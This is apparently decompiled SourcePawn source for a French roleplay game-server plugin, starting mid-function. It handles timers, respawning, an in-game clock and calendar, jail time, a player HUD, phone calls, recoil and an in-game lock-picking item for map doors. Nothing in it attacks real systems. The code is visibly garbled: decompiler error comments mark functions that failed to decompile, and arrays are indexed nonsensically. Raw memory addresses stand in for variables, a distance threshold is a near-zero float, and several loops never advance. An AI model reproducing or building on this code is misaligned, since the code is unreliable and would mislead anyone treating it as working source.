	decl Float:absOrigin[3];
	absOrigin[0] = -2830.895;
	absOrigin[1] = -793.2665;
	absOrigin[2] = -346.6118;
	decl Float:absAngles[3];
	absAngles[0] = -0.482839;
	absAngles[1] = -10.25854;
	absAngles[2] = -88.78677;
	TeleportEntity(m3_index, absOrigin, absAngles, NULL_VECTOR);
	SetEntityMoveType(m3_index, MoveType:0);
	return Action:0;
}

public Action:SpawnInfiniteScout(Handle:timer, param1)
{
	decl Float:absOrigin[3];
	absOrigin[0] = -2954.113;
	absOrigin[1] = -2173.146;
	absOrigin[2] = -225.6371;
	decl Float:absAngles[3];
	absAngles[0] = 3.169657;
	absAngles[1] = 12.40559;
	absAngles[2] = 65.08556;
	TeleportEntity(scout_index, absOrigin, absAngles, NULL_VECTOR);
	SetEntityMoveType(scout_index, MoveType:0);
	return Action:0;
}


/* ERROR! Index was outside the bounds of the array. */
 function "SaveAll" (number 269)
public Action:DBSaveInterval(Handle:timer, param1)
{
	CreateTimer(1, CheckLicenseDB, any:0, 0);
	return Action:0;
}

public Action:CreateSQLAccount(Handle:Timer, Client)
{
	if (IsClientConnected(Client))
	{
		decl String:SteamId[64];
		GetClientAuthString(Client, SteamId, 64);
		new var1;
		if (StrEqual(SteamId, "", true))
		{
			CreateTimer(2, CreateSQLAccount, Client, 0);
		}
		else
		{
			InQuery = 1;
			InitializeClientonDB(Client);
		}
	}
	else
	{
		CreateTimer(2, CreateSQLAccount, Client, 0);
	}
	return Action:0;
}

public Action:UnFreezePlayer(Handle:timer, Player)
{
	if (IsClientInGame(Player))
	{
		if (0 < TazerTimer[Player][0][0])
		{
			TazerTimer[Player]--;
			CreateTimer(1, UnFreezePlayer, Player, 0);
			decl Float:entorigin[3];
			GetEntPropVector(Player, PropType:0, "m_vecOrigin", entorigin, 0);
			new ii = 1;
			while (ii < 8)
			{
				entorigin[2] += ii * 9;
				TE_SetupBeamRingPoint(entorigin, 45, 45.1, g_BeamSprite, g_HaloSprite, 0, 1, 0.1, 8, 1, 210408, 1, 0);
				TE_SendToAll(0);
				entorigin[2] -= ii * 9;
				ii++;
			}
		}
		if (IsPlayerAlive(Player))
		{
			SetEntityMoveType(Player, MoveType:2);
		}
		TazerTimer[Player] = 0;
	}
	return Action:0;
}

public Action:Respawn_PlayerTimer(Handle:timer, param1)
{
	if (IsClientInGame(param1))
	{
		if (!IsPlayerAlive(param1))
		{
			if (player_respawn_wait[param1][0][0] > 1)
			{
				new var1 = player_respawn_wait[param1];
				var1 = var1[0][0] + -1;
				CreateTimer(1, Respawn_PlayerTimer, param1, 0);
			}
			player_respawn_wait[param1] = 0;
			new Handle:respawn_temp_menu = CreateMenu(Respawn_Menu, MenuAction:28);
			AddMenuItem(respawn_temp_menu, "g_InfoMenu", "Appuyez sur 1 pour reapparaitre", 0);
			SetMenuTitle(respawn_temp_menu, "");
			SetMenuExitButton(respawn_temp_menu, false);
			DisplayMenu(respawn_temp_menu, param1, 0);
		}
	}
	return Action:0;
}

public Action:LowPriorityActions(Handle:Timer, client2)
{
	new var1;
	if (!StrEqual(VersionLRP, "1.2.5", true))
	{
		lockupdate = 1;
		MakeMAJ();
	}
	new client = 1;
	while (client < MaxClients)
	{
		new var2;
		if (IsClientConnected(client))
		{
			if (!IsPlayerAlive(client))
			{
				SetEntProp(client, PropType:0, "m_iHideHUD", any:16, 4, 0);
			}
			if (!(GetEntityMoveType(client)))
			{
				Client_ChangeWeapon(client, "weapon_knife");
			}
			new var3;
			if (!EspionMode[client][0][0])
			{
				decl String:ClanTagRankName[20];
				GetClanTagName(JobID[client][0][0], RankID[client][0][0], ClanTagRankName, 20);
				CS_SetClientClanTag(client, ClanTagRankName);
			}
			new var4;
			if (JobID[client][0][0] == 1)
			{
				SwitchTeam(client, 3);
			}
			new var5;
			if (JobID[client][0][0] != 1)
			{
				SwitchTeam(client, 2);
			}
			new var6;
			if (GetClientTeam(client))
			{
				CS_SwitchTeam(client, 2);
			}
			Client_SetDeaths(client, 0);
			Client_SetScore(client, 0);
			client++;
		}
		client++;
	}
	return Action:0;
}

public Action:TickTimer(Handle:timer, client2)
{
	CreateTimer(1, LowPriorityActions, any:0, 0);
	Uptime += 1;
	if (Minutes >= 59)
	{
		if (Hours == 23)
		{
			Hours = 0;
			Days = Days + 1;
			SalaryTime();
		}
		else
		{
			Hours = Hours + 1;
		}
		Minutes = 0;
		DBRPSaveClock();
	}
	new var1;
	if (Months)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var2;
	if (Months == 1)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var3;
	if (Months == 2)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var4;
	if (Months == 3)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var5;
	if (Months == 4)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var6;
	if (Months == 5)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var7;
	if (Months == 6)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var8;
	if (Months == 7)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var9;
	if (Months == 8)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var10;
	if (Months == 9)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var11;
	if (Months == 10)
	{
		Months += 1;
		Days = 1;
		DBRPSaveClock();
	}
	new var12;
	if (Months == 11)
	{
		Months = 0;
		Years += 1;
		Days = 1;
		DBRPSaveClock();
	}
	Minutes = Minutes + 1;
	new client = 1;
	while (client < MaxClients)
	{
		new var13;
		if (IsClientConnected(client))
		{
			TempJailTime[client] = JailTime[client][0][0];
			while (TempJailTime[client][0][0] >= 60)
			{
				new var23 = TempJailTime[client];
				var23 = var23[0][0] + -60;
				new var24 = TempJailHours[client];
				var24 = var24[0][0] + 1;
			}
			JailHours[client] = TempJailHours[client][0][0];
			TempJailHours[client] = 0;
			JailMinutes[client] = TempJailTime[client][0][0];
			TempJailTime[client] = 0;
			new var14;
			if (JailTime[client][0][0] == 1)
			{
				FreePlayer(client);
			}
			new var15;
			if (JailTime[client][0][0] > 0)
			{
				new var25 = JailTime[client];
				var25 = var25[0][0] + -1;
			}
			if (!AfkMode[client][0][0])
			{
				new var26 = PlayTime[client];
				var26 = var26[0][0] + 1;
				new var27 = PlayTimeSinceLogin[client];
				var27 = var27[0][0] + 1;
				if (PlayTimeSinceLogin[client][0][0] >= 600)
				{
					PlayTimeSinceLogin[client] = 0;
				}
			}
			new amount = GetClientHealth(client) + 1;
			new var19;
			if (IsPlayerAlive(client))
			{
				SetEntityHealth(client, amount);
			}
			GetJobName(JobID[client][0][0], JobName[client][0][0], 64);
			GetRankName(JobID[client][0][0], RankID[client][0][0], RankName[client][0][0], 64);
			decl String:GroupName[128];
			GetGroupName(Group[client][0][0], GroupName, 128);
			new Handle:hBuffer = StartMessageOne("KeyHintText", client, 0);
			if (hBuffer)
			{
				decl String:tmptext[1024];
				decl String:tmptext0[100];
				decl String:tmptext1[256];
				decl String:tmptext2[256];
				decl String:tmptext3[256];
				decl String:tmptext4[256];
				decl String:tmptext5[256];
				decl String:tmptext6[256];
				decl String:tmptext7[256];
				decl String:tmptext8[256];
				decl String:tmptext9[256];
				if (!StrEqual(Wanted, "NO", true))
				{
					new pWanted = Client_FindBySteamId(Wanted);
					if (pWanted != -1)
					{
						Format(tmptext0, 100, "Joueur recherche: %N\n\n", pWanted);
					}
				}
				if (0 < FlameLeft[client][0][0])
				{
					Format(tmptext9, 255, "Lance-Flamme restants: %i\n\n", FlameLeft[client]);
				}
				Format(tmptext1, 255, "Argent: %i$\nEn banque: %i$\nEntreprise: %s\nPoste: %s\nSalaire: %i$\n", money[client], bank[client], JobName[client][0][0], RankName[client][0][0], Salary[client]);
				if (0 < Group[client][0][0])
				{
					Format(tmptext8, 255, "Groupe: %s\n", GroupName);
				}
				if (RankID[client][0][0] == 1)
				{
					Format(tmptext2, 255, "Capital de l'Entreprise: %i$\n", Capital[JobID[client][0][0]]);
				}
				new var20;
				if (Hours >= 10)
				{
					Format(tmptext3, 255, "Horloge: %i:0%i - %i %s %i\n", Hours, Minutes, Days, MonthName, Years);
				}
				else
				{
					new var21;
					if (Hours < 10)
					{
						Format(tmptext3, 255, "Horloge: 0%i:%i - %i %s %i\n", Hours, Minutes, Days, MonthName, Years);
					}
					new var22;
					if (Hours < 10)
					{
						Format(tmptext3, 255, "Horloge: 0%i:0%i - %i %s %i\n", Hours, Minutes, Days, MonthName, Years);
					}
					Format(tmptext3, 255, "Horloge: %i:%i - %i %s %i\n", Hours, Minutes, Days, MonthName, Years);
				}
				Format(tmptext4, 255, "Zone: %s\n", Zone[client][0][0]);
				if (0 < JailTime[client][0][0])
				{
					Format(tmptext5, 255, "Temps restant en prison: %i:%i\n", JailHours[client], JailMinutes[client]);
				}
				if (HaveJetPack[client][0][0])
				{
					Format(tmptext6, 255, "Gaz restant dans l'AirControl: %i\n", JetPackGaz[client]);
				}
				if (isInvi[client][0][0])
				{
					Format(tmptext7, 255, "Vous etes actuellement invisible.");
				}
				Format(tmptext, 1024, "%s%s%s%s%s%s%s%s%s%s", tmptext0, tmptext9, tmptext1, tmptext8, tmptext2, tmptext3, tmptext4, tmptext5, tmptext6, tmptext7);
				BfWriteByte(hBuffer, 1);
				BfWriteString(hBuffer, tmptext);
				EndMessage();
				if (!IsPlayerAlive(client))
				{
					if (0 < player_respawn_wait[client][0][0])
					{
						PrintCenterText(client, "Vous allez reapparaitre dans: %i secondes", player_respawn_wait[client]);
						client++;
					}
					PrintCenterText(client, "Appuyez sur 1 pour reapparaitre !");
					client++;
				}
				client++;
			}
			else
			{
				PrintToChat(client, "INVALID_HANDLE");
				client++;
			}
			client++;
		}
		client++;
	}
	return Action:0;
}

public Action:TimerGazAirControl(Handle:Timer, client)
{
	new var1;
	if (IsClientInGame(client))
	{
		if (IsPlayerAlive(client))
		{
			if (0 < JetPackGaz[client][0][0])
			{
				new var2 = JetPackGaz[client];
				var2 = var2[0][0] + -1;
			}
			CreateTimer(1, TimerGazAirControl, client, 0);
		}
	}
	return Action:0;
}

public Action:TimeOutCall(Handle:Timer, Client)
{
	if (0 < TimeOut[Client][0][0])
	{
		new var2 = TimeOut[Client];
		var2 = var2[0][0] + -1;
	}
	if (!Connected[Client][0][0])
	{
		TimeOut[Client] = 0;
	}
	new var1;
	if (!Answered[Client][0][0])
	{
		new Player = Connected[Client][0][0];
		PrintToChat(Client, "[L-RP] %N ne repond pas au telephone", Player);
		Answered[Client] = 0;
		Connected[Client] = 0;
	}
	if (0 < TimeOut[Client][0][0])
	{
		CreateTimer(1, TimeOutCall, Client, 0);
	}
	return Action:0;
}

public Action:TimeOutRecieve(Handle:Timer, Client)
{
	if (0 < TimeOut[Client][0][0])
	{
		new var2 = TimeOut[Client];
		var2 = var2[0][0] + -1;
	}
	if (!Connected[Client][0][0])
	{
		TimeOut[Client] = 0;
	}
	new var1;
	if (!Answered[Client][0][0])
	{
		PrintToChat(Client, "[L-RP] Votre telephone a arreter de sonner.");
		Answered[Client] = 0;
		Connected[Client] = 0;
	}
	if (0 < TimeOut[Client][0][0])
	{
		CreateTimer(1, TimeOutRecieve, Client, 0);
	}
	return Action:0;
}

public Action:TimerRecoil(Handle:timer, client)
{
	new Float:g_fRecoilMul = -60;
	static Float:fPush[3];
	static Float:fPlayerVel[3];
	static Float:fPlayerAng[3];
	GetClientEyeAngles(client, 211240);
	GetEntPropVector(client, PropType:1, "m_vecVelocity", 211252, 0);
	new var1 = fPlayerAng;
	var1[0] = -1 * var1[0][0];
	fPlayerAng[0] = DegToRad(fPlayerAng[0][0]);
	fPlayerAng[1] = DegToRad(fPlayerAng[1][0]);
	fPush[0] = g_fRecoilMul * Cosine(fPlayerAng[0][0]) * Cosine(fPlayerAng[1][0]) + fPlayerVel[0][0];
	fPush[1] = g_fRecoilMul * Cosine(fPlayerAng[0][0]) * Sine(fPlayerAng[1][0]) + fPlayerVel[1][0];
	fPush[2] = Sine(fPlayerAng[0][0]) + fPlayerVel[2][0];
	TeleportEntity(client, NULL_VECTOR, NULL_VECTOR, 211264);
	decl Float:vecPunch[3];
	vecPunch[0] = GetRandomFloat(-5, 5);
	vecPunch[1] = GetRandomFloat(-5, 5);
	vecPunch[2] = GetRandomFloat(-5, 5);
	if (offsPunchAngle != -1)
	{
		SetEntDataVector(client, offsPunchAngle, vecPunch, false);
	}
	return Action:0;
}

public Action:Autolock(Handle:timer, hammerid)
{
	new ent = Entity_FindByHammerId(hammerid, "");
	if (IsValidEntity(ent))
	{
		AcceptEntityInput(ent, "forceclosed", -1, -1, 0);
		AcceptEntityInput(ent, "Lock", -1, -1, 0);
	}
	return Action:0;
}


/* ERROR! Object reference not set to an instance of an object. */
 function "UpdateZone" (number 281)
bool:IsbetweenRect(Float:Corner1[3], Float:Corner2[3], Ent, bool:IsPlayer)
{
	decl Float:Entity[3];
	decl Float:field1[2];
	decl Float:field2[2];
	decl Float:field3[2];
	if (IsPlayer)
	{
		GetClientAbsOrigin(Ent, Entity);
	}
	else
	{
		GetEntPropVector(Ent, PropType:0, "m_vecOrigin", Entity, 0);
	}
	if (FloatCompare(Corner1[0], Corner2[0]) == -1)
	{
		field1[0] = Corner1[0];
		field1[1] = Corner2[0];
	}
	else
	{
		field1[0] = Corner2[0];
		field1[1] = Corner1[0];
	}
	if (FloatCompare(Corner1[1], Corner2[1]) == -1)
	{
		field2[0] = Corner1[1];
		field2[1] = Corner2[1];
	}
	else
	{
		field2[0] = Corner2[1];
		field2[1] = Corner1[1];
	}
	if (FloatCompare(Corner1[2], Corner2[2]) == -1)
	{
		field3[0] = Corner1[2];
		field3[1] = Corner2[2];
	}
	else
	{
		field3[0] = Corner2[2];
		field3[1] = Corner1[2];
	}
	new var1;
	if (Entity[0] < field1[0])
	{
		return false;
	}
	new var2;
	if (Entity[1] < field2[0])
	{
		return false;
	}
	new var3;
	if (Entity[2] < field3[0])
	{
		return false;
	}
	return true;
}

public ItemCrochettage(client)
{
	new var1;
	if (IsClientInGame(client))
	{
		decl String:ClassName[256];
		EntKitCrochettage[client] = GetClientAimTarget(client, false);
		if (EntKitCrochettage[client][0][0] != -1)
		{
			GetEdictClassname(EntKitCrochettage[client][0][0], ClassName, 255);
			new var2;
			if (StrEqual(ClassName, "func_door", true))
			{
				decl Float:door_vec[3];
				decl Float:plyr_vec[3];
				new Float:dist_vec = 0;
				GetClientAbsOrigin(client, plyr_vec);
				GetEntPropVector(EntKitCrochettage[client][0][0], PropType:0, "m_vecOrigin", door_vec, 0);
				dist_vec = GetVectorDistance(plyr_vec, door_vec, false);
				if (!IsCrochette[client][0][0])
				{
					if (dist_vec < 1.261169E-43)
					{
						SetEntPropFloat(client, PropType:0, "m_flProgressBarStartTime", GetGameTime(), 0);
						SetEntProp(client, PropType:0, "m_iProgressBarDuration", any:10, 4, 0);
						SetEntityMoveType(client, MoveType:0);
						SetEntityRenderColor(client, 255, 0, 0, 255);
						IsCrochette[client] = 1;
						CreateTimer(10, Stop_BarTime, client, 0);
						new var3 = KitCrochettage[client];
						var3 = var3[0][0] + -1;
						PrintToChat(client, "[L-RP] Vous avez utiliser un Kit de Crochetage.");
						decl String:SteamID[64];
						GetClientAuthString(client, SteamID, 64);
						LogMessage("%N(%s) a utiliser un Kit de Crochettage sur %i", client, SteamID, EntKitCrochettage[client]);
					}
					else
					{
						PrintToChat(client, "[L-RP] Vous etes trop loin de la porte pour pouvoir la crocheter.");
					}
				}
				else
				{
					PrintToChat(client, "[L-RP] Vous ne pouvez pas crocheter pour le moment.");
				}
			}
			PrintToChat(client, "[L-RP] Vous devez viser une porte.");
		}
	}
	return 0;
}

public Action:Stop_BarTime(Handle:timer, param1)
{
	new var1;
	if (param1)
	{
		new var2;
		if (IsClientInGame(param1))
		{
			SetEntPropFloat(param1, PropType:0, "m_flProgressBarStartTime", GetGameTime(), 0);
			SetEntProp(param1, PropType:0, "m_iProgressBarDuration", any:0, 4, 0);
			SetEntityMoveType(param1, MoveType:2);
			SetEntityRenderColor(param1, 255, 255, 255, 255);
			IsCrochette[param1] = 0;
			if (!IsInJail[param1][0][0])
			{
				decl String:ClassName[256];
				GetEdictClassname(EntKitCrochettage[param1][0][0], ClassName, 255);
				if (!StrEqual(ClassName, "prop_vehicle_driveable", true))
				{
					new EntHammerId = Entity_GetHammerId(EntKitCrochettage[param1][0][0]);
					new random = GetRandomInt(1, 100);
					decl chances;
					new var3;
					if (EntHammerId == 4808)
					{
						chances = 35;
					}
					else
					{
						new var4;
						if (EntHammerId == 4333)
						{
							chances = 20;
						}
						chances = 60;
					}
					if (random < chances)
					{
						new var5;
						if (EntHammerId == 269408)
						{
							PrintToChat(param1, "[L-RP] Cette porte est inviolable.");
						}
						else
						{
							new var6;
							if (EntHammerId == 4808)
							{
								CreateTimer(120, Autolock, EntHammerId, 0);
							}
							else
							{
								new var7;
								if (EntHammerId == 4333)
								{
									CreateTimer(60, Autolock, EntHammerId, 0);
								}
							}
							if (EntHammerId == 4844)
							{
								AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
								AcceptEntityInput(Entity_FindByHammerId(4834, ""), "Unlock", param1, -1, 0);
								AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
								AcceptEntityInput(Entity_FindByHammerId(4834, ""), "Toggle", param1, -1, 0);
								CreateTimer(120, Autolock, EntHammerId, 0);
								CreateTimer(120, Autolock, any:4834, 0);
							}
							else
							{
								if (EntHammerId == 4834)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4844, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4844, ""), "Toggle", param1, -1, 0);
									CreateTimer(120, Autolock, EntHammerId, 0);
									CreateTimer(120, Autolock, any:4844, 0);
								}
								if (EntHammerId == 5761)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5762, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 5762)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5761, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 5753)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5755, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 5755)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5753, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 197748)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(197753, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 197753)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(197748, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 88436)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(88441, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 88441)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(88436, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 6539)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(6543, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 6543)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(6539, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4531)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4539, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4539)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4531, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 121648)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(121653, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 121653)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(121648, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4149)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4150, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4150)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4149, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4147)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4148, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4148)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4147, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4297)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4299, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4299, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 4299)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4297, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4297, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 4305)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4307, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4307, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 4307)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4305, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4305, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 129942)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(129947, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 129947)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(129942, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 5553)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5559, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 5559)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5553, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4224)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4225, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4225)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4224, ""), "Unlock", param1, -1, 0);
								}
								if (EntHammerId == 4172)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4174, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4174, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 4174)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4172, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(4172, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 5568)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 5565)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 5571)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5574, ""), "Toggle", param1, -1, 0);
								}
								if (EntHammerId == 5574)
								{
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Unlock", param1, -1, 0);
									AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5568, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5565, ""), "Toggle", param1, -1, 0);
									AcceptEntityInput(Entity_FindByHammerId(5571, ""), "Toggle", param1, -1, 0);
								}
								AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
								AcceptEntityInput(EntKitCrochettage[param1][0][0], "Toggle", param1, -1, 0);
							}
							EmitSoundToClient(param1, "doors/latchunlocked1.wav", param1, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
							PrintToChat(param1, "[L-RP] Vous avez reussi votre crochettage.");
						}
					}
					else
					{
						PrintToChat(param1, "[L-RP] Vous avez echoue votre tentative de crochettage.");
					}
				}
				else
				{
					new random = GetRandomInt(1, 100);
					if (random > 50)
					{
						AcceptEntityInput(EntKitCrochettage[param1][0][0], "Unlock", param1, -1, 0);
						EmitSoundToClient(param1, "doors/latchunlocked1.wav", param1, 0, 75, 0, 1, 100, -1, NULL_VECTOR, NULL_VECTOR, true, 0);
						PrintToChat(param1, "[L-RP] Vous avez reussi votre crochettage.");
					}
					else
					{
						PrintToChat(param1, "[L-RP] Vous avez echoue votre tentative de crochettage.");
					}
